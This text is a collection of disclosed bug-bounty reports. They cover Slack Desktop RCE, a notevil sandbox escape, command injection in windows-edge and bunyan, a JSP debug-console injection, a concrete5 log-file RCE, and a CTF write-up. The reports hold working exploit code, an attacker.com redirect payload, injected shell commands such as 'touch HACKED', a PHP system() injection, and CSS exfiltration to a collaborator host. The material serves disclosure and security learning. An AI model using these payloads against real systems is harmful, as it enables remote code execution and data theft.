To edit the JSON structure directly and inject in that way, you can use the web UI provided by Slack itself:
```
https://{YOUR-TEAM-HOSTNAME}.slack.com/files/{YOUR-MEMBER-ID}/{FILE-ID}/title/edit
```
`YOUR-MEMBER-ID` you can copy from your profile view, it's in the format `UXXXXXXXX`

{F696964}

**Alternatively**, it's possible to upload a Javascript/JSON snippet and change it's filetype to `docs` by editing the `filetype` parameter with a HTTP proxy.

Upload payload.json with the JSON below:
{F696941}

Change filetype by intercepting request when when editing file, e.g. change title and intercept HTTP request to `/api/files.edit`:
{F696942}

Since no HTML embedding is possible and various interesting tags are restricted + Javascript is not available because of existing protections and a defined CSP, a new HTML injection payload was developed:
```
<img src="https://files.slack.com/files-tmb/T02AVL3AF-FSUE04U2D-881f692a25/screenshot_2020-01-26_at_21.12.20_360.png" width="10000" height="10000" usemap="#slack-img">
<map name="slack-img">
<area shape="rect" coords="10000,10000 0,0" href="https://attacker.com/t.html" target="_self">
</map>
```
Note this payload requires an image to reference with the attribute `usemap`. This can be hosted in Slack infrastructure by uploading an image to Slack beforehand.

JSON to provide for Slack Post edit @ `https://{YOUR-TEAM-HOSTNAME}.slack.com/files/{YOUR-MEMBER-ID}/{FILE-ID}/title/edit` payload.json:
```
{
  "full": "asd",
  "preview": "<img src=\"https://files.slack.com/files-tmb/T02AVL3AF-FSUE04U2D-881f692a25/screenshot_2020-01-26_at_21.12.20_360.png\" width=\"10000\" height=\"10000\" usemap=\"#slack-img\"><map name=\"slack-img\"><area shape=\"rect\" coords=\"10000,10000 0,0\" href=\"https://attacker.com/t.html\" target=\"_self\"></map>"
}
```

### 3. RCE exploit code - hosted on attacker's website 

the URL link within the `area` tag would contain this HTML / JS exploit for Slack Desktop apps which executes any attacker provided command:
```
<html>
<body>
<script>
  // overwrite functions to get a BrowserWindow object:
  window.desktop.delegate = {}
  window.desktop.delegate.canOpenURLInWindow = () => true
  window.desktop.window = {}
  window.desktop.window.open = () => 1
  bw = window.open('about:blank') // leak BrowserWindow class
  nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}}) // let's make our own with nodeIntegration
  nbw.loadURL('about:blank') // need to load some URL for interaction
  nbw.webContents.executeJavaScript('this.require("child_process").exec("open /Applications/Calculator.app")') // exec command
</script>
</body>
</html>
```

For windows just replace `open /Applications/Calculator.app` with `calc` or anything else.

To test the RCE payload, you can open Developer Tools on any Slack Desktop app and paste only the Javascript code in console. It achieves RCE and illustrates that it's independent of any entry point - i.e. redirect within the desktop app.

### 4. easy access to all private data without command execution 

The payload can be easily modified to **access all private conversations, files, tokens etc.** without executing commands on the user's computer: 
```
<html>
<body>
<script>
  window.desktop.delegate = {}
  window.desktop.delegate.canOpenURLInWindow = () => true
  window.desktop.window = {}
  window.desktop.window.open = () => 1
  bw = window.open('about:blank')
  nbw = new bw.constructor({show: false}) // node not necessary for this demo
  nbw.loadURL('https://app.slack.com/robots.txt') // robots.txt for speed, app.slack.com gives us the user's full environment 
  nbw.webContents.executeJavaScript('alert(JSON.stringify(localStorage))')
</script>
</body>
</html>
```

{F697023}

Essentially, this gives an attacker full remote control over the Slack desktop app via overwriting Slack desktop app env functions and providing a "tunnel" via `BrowserWindow` to execute arbitrary Javascript, i.e. a weird XSS case with full access to anything the Slack app has - easy access to private channels, conversations, functions etc.

# files.slack.com - alternate payload store and an XSS in itself

During search for an entry point for the RCE exploit, it was discovered that emails (when sent as plaintext) are stored unfiltered on Slack servers at https://files.slack.com and with direct access returned as text/html, without force-download.

This HTML file upload functionality can be used for storing the RCE payload - no need to use own hosting. 

{F697020}

Since it's a trusted domain, it could contain a phishing page with a fake Slack login page or different arbitrary content which could impact both security and reputation of Slack. There are no security headers or any restrictions at all as far as I could tell and I'm sure some other security impact could be demonstrated with enough time. 

{F697019}

## How to upload html to files.slack.com

Any email client can be used, i.e. in macOS's default client you can press CMD+SHIFT+T to make an email plaintext, copy paste the RCE payload from above and embed it in your Slack Post HTML injection. 

{F697018}

As the "Send To Slack" email address, you have to use your custom email integration address or private email address - [instructions](https://slack.com/intl/en-lv/slack-tips/send-email-to-slack). Scroll to "Send one email at a time into Slack with forwarding address" for easy setup - no app integration or installs necessary.

The uploaded HTML file can then be found via the UI "open original" or by the same `/api/files.info` API call on e-mail file id and then visiting the `url_private` link.

# TL;DR

- HTML injection path via web UI - direct editing of Post file structure 
- alternatively HTML injection via file conversion from `Javascript/JSON` to `docs` - achieves same goal of editing Post structure directly
- new pure HTML payload to redirect Slack Desktop app
- new OS-agnostic Remote Code Execution payload  - requires any kind of in-app redirect to a malicious page 
- XSS in files.slack.com without restriction via e-mail 
- **all files of course must be shared with the recipients via the usual methods** otherwise private files are inaccessible

## Impact

Remote Code Execution in Slack desktop apps:
- access to private files, private keys, passwords, secrets, internal network access etc.
- access to private conversations, files etc. within Slack
- payload could be made "wormable" - re-post to all user workspaces after click

XSS in files.slack.com
- arbitrary HTML content in *.slack.com - trusted page
- phishing with fake HTML login page
- can be used to store above RCE exploit

---

### [[notevil] - Sandbox Escape Lead to RCE on Node.js and XSS in the Browser](https://hackerone.com/reports/809012)

- **Report ID:** `809012`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @phra
- **Bounty:** - usd
- **Disclosed:** 2020-08-27T16:14:50.822Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a sandbox escape / code injection vulnerability in notevil.

It allows an attacker to escape the intended sandbox and execute javascript code in the global context, meaning that he/she can achieve arbitrary command execution (RCE) when running in nodejs and cross site scripting (XSS) when running in the browser.

# Module

**module name:** notevail
**version:** 1.3.2
**npm page:** `https://www.npmjs.com/package/notevil`

## Module Description

Evalulate javascript like the built-in javascript eval() method but safely.

This module uses esprima to parse the javascript AST then walks each node and evaluates the result.

Like built-in eval, the result of the last expression will be returned. Unlike built-in, there is no access to global objects, only the context that is passed in as the second object.

Built in types such as Object and String are still available, but they are wrapped so that any changes to prototypes are contained in the eval instance.

## Module Stats

[1] weekly downloads: 3,290

# Vulnerability

## Vulnerability Description

A bypass to a previous sandbox escape fix (https://github.com/mmckegg/notevil/commit/5974329712f0a527c5e16d3b9067a076e28e45f1) is existing and proven by the attached poc.

## Steps To Reproduce:

### Node.js

```
var safeEval = require("notevil")

var code = "" +
    "function fn() {};" +
    "var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;" +
    "var properties = Object.values(constructorProperty);" +
    "properties.pop();" +
    "properties.pop();" +
    "properties.pop();" +
    "var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();" +
    "(Func())()"
console.log(safeEval(code))
```

check the provided poc:
- http://runkit.com/phra/notevil---sandbox-escape

### Browser

If we check some dependent package, such as react-schema-form, we can see that the issue lead to XSS when the affected package is used in the browser.

1. visit https://networknt.github.io/react-schema-form/
2. set form
```
[
  {
    "key": "comments",
    "condition": "function fn() {};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.alert(`pwned `)')}).pop();(Func())()",
    "type": "radios",
    "titleMap": [
      {
        "value": "S",
        "name": "Shipping"
      },
      {
        "value": "P",
        "name": "Pickup"
      }
    ]
  }
]
```
3. set schema
```
{
  "type": "object",
  "required": [
    "comments"
  ]
}
```

## Patch

*TBD*

## Supporting Material/References:

not applicable.

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

An attacker can execute arbitrary commands on the system when the package is used with nodejs and execute arbitrary javascript when is used in the browser.

---

### [[windows-edge] RCE via insecure command formatting](https://hackerone.com/reports/878420)

- **Report ID:** `878420`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @mik317
- **Bounty:** - usd
- **Disclosed:** 2020-08-24T22:04:31.879Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `RCE` issue in the `windows-edge` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `windows-edge`
**version:** `1.0.1`
**npm page:** `https://www.npmjs.com/package/windows-edge`

## Module Description
> Launch a new Microsoft Edge tab on Windows

## Module Stats
[102] downloads in the last week

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/eugeneware/windows-edge/blob/master/index.js#L8

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
const edge = require('windows-edge');
edge({ uri: 'https://github.com/; touch HACKED; #' }, (err, ps) => {})

```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i windows-edge # Install affected module
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :) {F835199}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: v12.16.1
- [NPM VERSION]: 6.13.4

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `windows-edge`

---

### [Java Debug Console Provides Command Injection Without Privellage Esclation](https://hackerone.com/reports/767482)

- **Report ID:** `767482`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** MTN Group
- **Reporter:** @rpbeast33
- **Bounty:** - usd
- **Disclosed:** 2020-07-23T17:03:55.662Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

   I intially found the debug console as a tool to insert arbitrary html/xss bugs, however after further probing the debug console it has some serious security flaws to allow arbitrary java code to be executed. My intial report of a seperate bug using this console, https://hackerone.com/reports/767077, uses the out.print functionality to write html code into the jsp page to perform a XSS attack. This intself is a dangerous bug for compromising users of the webapp. However, what is even more dangerous is allowing any abritratry java code to be executed on the server that an attacker controls. This is exactly what the debug console allows. The console spawns calls the execute.jsp page and then spawns a new .jsp page to give back to the user. Within this scope, the java code that the user/attacker writes is excuted on the server with the privellages given to the new .jsp file under the auspcies of the execute.jsp file. What does this mean? Well, an attacker can write custom .jsp files with native java code to do all sorts of malicous things, which includes Local File Inclusion and overwriting/changing source code - among other attacks. 


## Steps To Reproduce:


  1. Visit: http://ptldynamicgame.mtn.sd/portal-api/tools/debug_console/index.jsp
  2. Write any java code you want to be excuted:


####PoC Java Code:
out.print("LOCAL FILE DATA");
out.print(":");%>
<%@ page import="java.util.Random"%>
<%@ page import="java.io.*"%>
<%
out.println("\n");
File file = new File("/etc/mime.types"); 
BufferedReader br = new BufferedReader(new FileReader(file)); 
String st;
while ((st = br.readLine()) != null)  
{ out.println(st); };%>
<% out.println("Exit");

        Here please note the custom import of java.io.* for file reading purposes.
        As you can see, you can directly import native java code into the .jsp file by closing your opening tag %> and then using 
        your own custom <% %> tags afterwords. At the end also note the <% to ensure the floating tag from the template jsp is closed

## Supporting Material/References:

As stated in my intro, this is similar to my other reported bug found here https://hackerone.com/reports/767077 , but is actually quite different in its attack vector and impact. This represents a uniquely different bug due to the fact you are able to execute java code on the server and thus you are attacking the server rather than performing an XSS attack to target clients of the webapp. Overall, in my opinion these are two distinct bugs that just use the same console as its source. Also what is key to note is you do not have to get the current runtime enviroment of java to execute malicous commands, which in itself would be another crtical bug.

## Impact

Overall the impact for this is critical. In my PoC I demonstrated how you can run attacker controlled java code to read local files, which in itself is a huge bug. However, the power of this bug comes from the ability to really craft the payload to do whatever an attacker desires on your site. Overall, this bug leads to Remote Code Execution which is critical to compromising a server.

**Summary (researcher):**

Arbitrary Java code could be executed inside a container on the server for debug purposes. However due to improper sandboxing an attacker could create a new .jsp file that would be served under the web servers temp folder. This attacker controlled file could then execute native java code with the permissions of the Web Servers ```uid```. 

The debug console was designed to insert an admins/users code within a ```.jsp``` file ```<% %>``` tags which would allow very limited code to be executed. Due to no filtering of user input, an attacker could close the intial ```<%``` tag and thus have full control over the .jsp file, including importing ```java classes```. The attack logically worked similar to an ```XSS``` attack where an attacker would close a HTML tag and insert their own. However, due the ability to have ```.jsp``` files include ```java``` code and execute on the server on load this attack is quite critical.  Overall this led to a situation where an attacker could have command injection on the server and could spawn a reverse shell, read local files, or other nefarious attacks. 

The below PoC was used to demonstrate reading local files on the server: 

```Java
out.print("LOCAL FILE DATA");
out.print(":");%>
<%@ page import="java.util.Random"%>
<%@ page import="java.io.*"%>
<%
out.println("\n");
File file = new File("/etc/mime.types");
BufferedReader br = new BufferedReader(new FileReader(file));
String st;
while ((st = br.readLine()) != null)

{ out.println(st); };%>
<% out.println("Exit");
```

---

### [Remote Code Execution through Extension Bypass on Log Functionality](https://hackerone.com/reports/841947)

- **Report ID:** `841947`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Concrete CMS
- **Reporter:** @mayllart
- **Bounty:** - usd
- **Disclosed:** 2020-07-03T20:43:31.003Z
- **CVE(s):** -

**Vulnerability Information:**

Summary:
=====================

The Application concrete5 CMS available on github is vulnerable to remote code execution through the functionality of setting the log file in "Loggin Settings". It is possible to bypass the portion of code responsible for the verification of the extension of the log file (.log).

Description:
=====================

The code in the {path_of_installation}/concrete5/concrete/controllers/single_page/dashboard/system/environment/logging.php has a vulnerable function (update_loggin()). This function has a condition that verifies if the parameter "handler" in the HTTP request is equal to "file" and, if the parameter "logging_mode" has any value. In case one of these conditions is not met the application will not proceed to verify if the extension of the log file ends with ".log" and will go straight to the next if, which verifies if there is any error (in case, there are not) and set the "concrete.log.configuration.simple.file.file" variable to the value of "logFile" parameter in the HTTP request. By doing that it is possible to set the log file to a .php file in the system. An attacker may be able to inject PHP code in the log File by injecting it on parameters in the application. Then, by requesting the file in the browser the code will get executed.

Vulnerable code:

```
public function update_logging()
    {
        $config = $this->app->make('config');
        if (!$this->token->validate('update_logging')) {
            $this->error->add($this->token->getErrorMessage());
        }
        if ($this->request->request->get('handler') == 'file' && $this->request->request->get('logging_mode')) { // this if condition that can be bypassed
            $logFile = $this->request->request->get('logFile');
            $filesystem = new Filesystem();
            $directory = dirname($logFile);
            if ($filesystem->isFile($logFile) && !$filesystem->isWritable($logFile)) {
                $this->error->add(t('Log file exists but is not writable by the web server.'));
            }
            if (!$filesystem->isFile($logFile) && (!$filesystem->isDirectory($directory) || !$filesystem->isWritable($directory))) {
                $this->error->add(t('Log file does not exist on the server. The directory of the file provided must exist and be writable on the web server.'));
            }
            $filename = basename($logFile);
            if (!$filename || substr($filename, -4) != '.log') {
                $this->error->add(t('The filename provided must be a valid filename and end with .log'));
            }
        }
        if (!$this->error->has()) {// it is possible to jump straight to this condition and set the log file to a .php file.
            $intLogErrorsPost = $this->post('ENABLE_LOG_ERRORS') == 1 ? 1 : 0;
            $intLogEmailsPost = $this->post('ENABLE_LOG_EMAILS') == 1 ? 1 : 0;
            $intLogApiPost = $this->post('ENABLE_LOG_API') == 1 ? 1 : 0;

            $config->save('concrete.log.errors', $intLogErrorsPost);
            $config->save('concrete.log.emails', $intLogEmailsPost);
            $config->save('concrete.log.api', $intLogApiPost);

            $mode = $this->request->request->get('logging_mode');
            if ($mode != 'advanced') {
                $mode = 'simple';
                $config->save('concrete.log.configuration.simple.core_logging_level',
                    $this->request->request->get('logging_level')
                );
                $config->save('concrete.log.configuration.simple.handler',
                    $this->request->request->get('handler')
                );
                $config->save('concrete.log.configuration.simple.file.file',
                    $this->request->request->get('logFile') //set the PHP 
                );
            }
            $config->save('concrete.log.enable_dashboard_report',
                $this->request->request->get('enable_dashboard_report') ? true : false);
            $config->save('concrete.log.configuration.mode', $mode);

            $this->redirect('/dashboard/system/environment/logging', 'logging_saved');
        }
```

Steps To Reproduce:
=====================

1) Login to the administrative panel of the application and navigate to :http://{concrete5_website}/index.php/dashboard/system/environment/logging. Set the File variable to: {INSTALLATION_PATH_OF_CONCRETE5}/pwned.php, send the request and intercept it.

{F776879}

2) Change the handler parameter in the HTTP request to any value. By doing that we will get straight to the next "if condition" mentioned before. However, by doing that the handler will be set to its default value (Database) in the backend.

{F776880}

{F776881}

3) Now we need to make the handler get the "file" value. We change the "Handler" in the panel to the "File" option and send the request again. Then, the request is intercepted and the value in the parameter "logging_mode" of the HTTP request must be completely erased. 

{F776882}

By doing that we will go straight to the next if, since the condition: $this->request->request->get('logging_mode'))` is not met. Right after entering the next if condition, the value of "logging_mode" will get restored to the value of "simple":

```
if ($mode != 'advanced') {
                $mode = 'simple';
```

4) To get the code execution to work we now need to inject the malicious PHP code in the log file. This can be achieve by trying to login with a user called: <?php system('id'); ?>.

{F776883}

We can see the file is now created in the server with the malicious content.

{F776884}

{F776885}

5) By accessing the file in the browser it is possible to verify that the code is successfully executed.

{F776886}

Resubmitted the report since it was missing the "crayons".

Thanks!!

## Impact

OS command execution in the webserver under the permissions of the OS user executing the server application, being able to completely modify the application code or compromise the server (reading, editing, adding or removing files). In case of selecting a .php file that already exists in the server it will have log text appended to it and will interrupt the application operation (example: select the index.php as the log file) by resulting in a malformed php file.

---

### [bunyan - RCE via insecure command formatting](https://hackerone.com/reports/902739)

- **Report ID:** `902739`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @ahihi
- **Bounty:** - usd
- **Disclosed:** 2020-06-27T01:53:03.703Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report RCE in bunyan
It allows arbitrary commands remotely inside the victim's PC

# Module

**module name:** bunyan
**version:** 1.8.12
**npm page:** `https://www.npmjs.com/package/bunyan`

## Module Description

> Bunyan is a simple and fast JSON logging library for node.js services:

## Module Stats

[920,196] weekly downloads

# Vulnerability

## Vulnerability Description

> The issue occurs because a user input is formatted inside a command that will be executed without any check. https://github.com/trentm/node-bunyan/blob/master/bin/bunyan#L1224

## Steps To Reproduce:

> Run the following command
npm install bunyan
./node_modules/bunyan/bin/bunyan -p "S'11;touch hacked ;'"
> Recheck the files: now hacked has been created
## Patch

> Check input before command

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- [OPERATING SYSTEM VERSION]: Ubuntu 18.04
- [NODEJS VERSION]: v8.10.0
- [NPM VERSION]: 3.5.2

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N] N 
- I opened an issue in the related repository: [Y/N] N

## Impact

RCE on bunyan.

---

### [[H1-2006 2020]  Connecting the dots to send hackers their Bug Bounty](https://hackerone.com/reports/889886)

- **Report ID:** `889886`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** h1-ctf
- **Reporter:** @akshansh
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T00:25:53.002Z
- **CVE(s):** -

**Vulnerability Information:**

Hello team Thank you so much for organising the ctf it has helped a lot to learn and improve my knowledge now lets got to solution i have preapred short videos as a refrence for each part and broken down ctf in 8 challenges.

So the ctf was broken into:
1. Gathering leaking to gain login credentials
2. Bypassing 1st 2fa
3. SSrf in cookies to getting the unauthorised apk  
4. Getting Leaked Secret from apk
5. Accessing new employee account
6. Upgrading account privilages to admin and getting admin credentials
7. Login to Martin account and bypass 2nd 2fa
8. Bypass payment 2fa via CSS Injection via ssrf to get the flag

# 1.Gathering leaking to gain login credentials

{F853363}
So first we get that scope of the ctf was *.bountypay.h1ctf.com 
so ran a quick certspotter search on them gave

```
api.bountypay.h1ctf.com		
app.bountypay.h1ctf.com		
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com	
www.bountypay.h1ctf.com		
```

and running dirsearch on them i was able to see that https://app.bountypay.h1ctf.com/ subdomain git directory was exposed now among its git files the important one 
was /.git/config file which gave me information about this github page https://github.com/bounty-pay-code/request-logger/commit/07e138f46b09e1a702b9df8f1e701db20a38defa#diff-c3692912e7cb4cbcd03da419c135060e
upon visting we get another path ```bp_web_trace.log``` so final path https://app.bountypay.h1ctf.com/p_web_trace.log
were having system logs of brian oliver access
which were base64 encoded log files which upon decoding were

```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```
we get login credentials username":"brian.oliver","password":"V7h0inzX", and 2fa answer for our next stage


# 2. Bypassing 1st 2fa
{F853368}

As soon as we are logged inside the account we face a 2fa now inspecting the page we can see the hidden field was challenge and we had to give a challenge answer as above the challeneg was an md5 hash so upon thinking i tried making an md5(bD83Jk27dQ) that was from earlier logs so the hash came out as ```5828c689761cce705a1c84d9b1a1ed5e``` 
so i made a  request whose body looked like ```username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ```
which upon passing to server successfully bypassed the 2fa.


# 3. SSrf in cookies to getting the unauthorised apk
{F853373}
As we are loggedin we see transaction record window used to fetch statements but as our account is not privileged so we cant fetch documents directly.
The request to fetch documents was send via rest api eg- https://api.bountypay.h1ctf.com/api/accounts/Ae8iJLkn9z/statements?month=01&year=2020
app requesting the api to fetch the records as we request so it was clear the cookie check is in place to check for allowed paths
the cookie we got was a jwt token which on decoding looked like
```{"account_id":"Ae8iJLkn9z","hash":"3616d6b2c15e50c0248b2276b484ddb2"}``` 
the interesting part was here the account_id was not being checked with the hash so we can inject our values and it would be accepted. 
Being stuck here for a moment realised 2 things
 first on api front page we had open redirect 
```https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API``` but it had a filter which only allowed a whitelisted urls

2nd was that https://software.bountypay.h1ctf.com/ was blocked by blocking requesting based upon ip address so it also only allowed urls incoming request via 
specific ips and block other ips 

So combining 2 scenarios i immediately tried ```https://api.bountypay.h1ctf.com/redirect?url=https://software.bountypay.h1ctf.com/``` but response was again unauthorised indicating we cannot do it directly but i tried to think and took an upper case of jwt cookies can we inject our ssrf payload to access the software website
for which our cookie should look like
```{"account_id":"./../../../../redirect?url=https://software.bountypay.h1ctf.com/?","hash":"3616d6b2c15e50c0248b2276b484ddb2"}```
which would traverse backwards in api directory and since its a virualhost this would work in system there locally making a request 
to software subdomain the request gave us a html formatted page via api which looked like a login page 
{F853380}
so we had to similarly guess more directory
now this can be done by bruteforcing the cookies with every time making a directory search via cookie, after doing this for a while the cookie
```{"account_id":"./../../../../redirect?url=https://software.bountypay.h1ctf.com/uploads?","hash":"3616d6b2c15e50c0248b2276b484ddb2"}```
i.e
```
eyJhY2NvdW50X2lkIjoiLi8uLi8uLi8uLi8uLi9yZWRpcmVjdD91cmw9aHR0cHM6Ly9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tL3VwbG9hZHM/IiwiaGFzaCI6IjM2MTZkNmIyYzE1ZTUwYzAyNDhiMjI3NmI0ODRkZGIyIn0=
```
helped to access an apk file path now we cannot download it via api so i tried appending the path to software url subdomain 
https://software.bountypay.h1ctf.com/BountyPay.apk and the apk was downloaded


#  4. Getting Leaked Secret from apk
{F853400}

On decompiling the apk we can see the first Mainactivity which upon launching  has input fields as username and twitter handle now as we enter the value it acts as a check for first activity 

## On first Activity
to move to second activity without passing checks the way possible was by accessing it via the deeplink since in manifest file we can see the path 
```<data android:scheme="one" android:host="part"/>``` so the link must look like one://part? put to execute it with parameters the java class bounty.pay.PartOneActivity expects ```start``` as parameter 
{F853422}
next checks for the  string PartTwoActivity if both conditions are satisfied then we can execute the deeplink the 
adb command would look like 
```adb shell am start -d one://part?start=PartTwoActivity```

## On 2nd Activity
After this we come to ParTwoActivity and see a blank instance of bounty.pay.PartTwoActivity here the key to jump to third activity properly was to verify checks on submitInfo function which prerequires the input screen to be visible first since we cannot see any fields so we can use our deeplink as used in manifest file to do this task
the visiblity condition would use 
{F853429}

```
String firstParam = data.getQueryParameter("two");
String secondParam = data.getQueryParameter("switch"); if (firstParam != null && firstParam.equals("light") && secondParam != null && secondParam.equals("on"))
``` 
so the deeplink would look like 

```adb shell am start -d "two://part?two=light\&switch=on"```

Now once we see the input field we can see its function handling submitInfo requires  if (str.equals(sb.toString())) which here checks if value Entered is X-Token or not so we simply enter the value and bypass to third activity

## On Third  Activity
Now the third activity was the main thing here we can see that PartThreeActivity function has a run function which will  fetches a token 
now to perform this action 
{F853430}
we can call our deeplink as three://part here parameters are three switch and header but the first two paramter require a base 64 value next on condition check we can see the switch parameter require PartThreeActivity:UGFydFRocmVlQWN0aXZpdHk= as its value switch:b24  requires on its value and header as X-Token
So after passing the deeplink via adb "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"
we can observe the adb logact throws us 

```
HOST IS: : http://api.bountypay.h1ctf.com
TOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1
HEADER VALUE AND HASH : X-Token: 8e9998ee3137ca9ade8f372739f062c1
```
After entering the hash 8e9998ee3137ca9ade8f372739f062c1 we get get congratsActivity which says information leaked here will help in other areas 
{F853443}
# 5. Accessing new employee account
{F853469}

After getting the X-Token and hostname it was clear that this was used for api.bountypay.h1ctf.com	we had to guess the path with the token so i made a bunch of wordlists based on website such as api,staff,software,admin,app etc and vai intruder bruteforced in this way api.bountypay.h1ctf.com/guesslist/guesslist  with X-Token in header after this i observed that the request 
```
GET /api/staff/ HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
``` 
was able to fetch 

```
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
``` 
but this was something already known for second account and with no login details further this was not much of use at this point on Hackerone Twitter handle which was 	BountyHQ twitter handle which tweeted about their employee Sandra Allison who had put their batch picture which revealed their id 
```
STF:8FJ3KFISL3
``` 
now the GET request was not able to fetch/send this info and get something i tried the post request but the response came back as ["Missing Parameter"] so looking upon the above get request we can see that parameter was staff_id so i tried sending it in a post request as ```staff_id=STF:8FJ3KFISL3``` and the response was her credentials

```
{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```


# 6. Upgrading account privilages to admin and getting admin credentials
{F853471}
Upon logging in as sandra we do not get much thigs to see around apart from settings ticket and homepage the website had an interseting file which was 
https://staff.bountypay.h1ctf.com/js/website.js the file had 2 functions of upgrading user to admin and reporting the url/page now sandra account would not be able to 
directly call the first function as she does not have the rights but the second function was interesting sendReport was available for sandra also it would make the #tab1  triggers element class tab1 
{F853459}
so if we can set username value in here make call via function ```let t=$('input[name="username"]').val();$.get("/admin/upgrade?username="``` then sandra would be upgraded the template would accept array function which would allow you to load more than one templates the use would be 
to make this work we need this template should be one login page and second should be the tickets because here in tickets page as we can see that i have set avatar to  tab1 upgradeToAdmin  this would be used to call function upgradetoAdmin
{F853460}
 but we also need to set username of who is being upgraded so the url should look like https://staff.bountypay.h1ctf.com/?template[]=ticket&ticket_id=358&template[]=home&username=sandra.allison#tab1
where when we submit this report would trigger automatically tab1 then it would call upgrade  for sandra and she would become the admin
After becoming admin see get a admin tab where we get 
Marten credentials
```marten.mickos  h&H5wy2Lggj*kKn4OD&Ype```
{F853461}

# 7. Login to Martin account and bypass 2nd 2fa
{F853472}
As we logged into martin account we saw a 2fa carrying a challenge and a challenge answer last time we had a answer whose md5 was challenge so this time we have
challenge  but no pre answers with us
so the solution to pass this was to take challenge from hidden input field  calling it as A and  md5(A) and the resulting hash B that you will get it would now become the challenge and so your request be something like   
```
challenge=B&challenge_answer=A
```
 which bypasses 2fa and send us to a pay page 


# 8. Bypass payment 2fa via CSS Injection via ssrf to get the flag
{F853475}
After 2fa bypass we see the pay button active for 5th month of year 2020 but upon clcking it asks for to send a challenge and complete it so the challenge upon sending was making a request to a stylesheet so sending any else url the server would make a request to it so a bit later i realised that we can exfiltrate the data for the challenge answer via css injection by sending our css file which would fetch every character from value of challenge but there was a catch in this after sending a request to mywebsite/test.css which was A-Z,a-z,0-9
```
input[name=challenge][value^=A]) ~ * {
    background-image: url(burpcollaborator);
}
```
the request didnt came in burpcollaborator this indicated that input name was not challenge in the backend rather something else so i made some css files to get the name like 

```
input[name^=c] ~ * {
    background-image: url(burpcollaaborator/c);
}
```
so after making some fuzzing around it i was able to get name as code_1,code_2,code_3,code_4,code_5,code_6 but 7th value was not as code_7 maybe so did that via intruder as in video

so to get values  i made the final css for code1-6 values A-Z,a-z,0-9 
```
input[name^=code_1][value^=A] ~ * {
    background-image: url(https://burpcollaborator/code1/A);
}
input[name^=code_2][value^=A] ~ * {
    background-image: url(https://burpcollaborator/code2/A);
}
input[name^=code_3][value^=A] ~ * {
    background-image: url(https://burpcollaborator/code3/A);
}
input[name^=code_4][value^=A] ~ * {
    background-image: url(https://burpcollaborator/code4/A);
}
input[name^=code_5][value^=A] ~ * {
    background-image: url(https://burpcollaborator/code5/A);
}
input[name^=code_6][value^=A] ~ * {
    background-image: url(https://burpcollaborator/code6/A);
}
```
so sending upon this css to app_style fetched me 6 values then 7th value was fetched by loading the position in intruder and sending payloads A-Z,a-z,0-9 
finally the response length 2163 was carrying the flag 


# ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$
{F853462}

## Impact

...

**Summary (researcher):**

# Here  a link to quick video walkthrough compiling the videos in one:
https://youtu.be/_kaEllJH99Y

---

